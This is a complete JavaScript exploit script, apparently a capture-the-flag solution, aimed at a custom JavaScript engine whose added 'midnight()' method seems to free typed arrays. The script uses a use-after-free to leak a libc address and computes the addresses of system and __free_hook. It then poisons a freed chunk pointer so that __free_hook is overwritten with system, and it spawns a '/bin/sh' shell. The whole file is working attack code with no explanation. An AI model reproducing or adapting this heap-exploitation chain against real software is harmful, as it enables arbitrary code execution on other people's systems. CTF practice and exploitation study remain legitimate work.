var arr1 = new Uint32Array(0x70/4);
var arr2 = new Uint32Array(0x70/4);
var arr3 = new Uint32Array(0x500/4);

for(var i=0;i<arr1.length/4;i++){
	arr1[i] = 0x61616161
}

for(var i=0;i<arr2.length/4;i++){
	arr2[i] = 0x62626262
}

arr1.midnight()
arr2.midnight()
arr3.midnight()

leak_1 = arr3[0];
leak_2 = arr3[1];
libc_leak = leak_2*0x100000000 + leak_1
libc_base = libc_leak-0x1ecbe0
system = libc_base + 0x52290
// binsh = 0x68732f6e69622f
binsh = libc_base+0x1b45bd
__free_hook = libc_base + 0x1eee48

console.log("libc base: "+libc_base)
console.log(system)
console.log(__free_hook)

arr2[0] = __free_hook&0xffffffff
arr2[1] = __free_hook/0x100000000

var arr4 = new Uint32Array(0x70/4);
var arr5 = new Uint32Array(0x70/4);

// http://127.0.0.1:8000/pwn.js
arr4[0] = 0x6e69622f
arr4[1] = 0x68732f
// arr4[2] = 0x64646464


arr5[0] = system&0xffffffff
arr5[1] = system/0x100000000

arr4.midnight()
Math.atan2()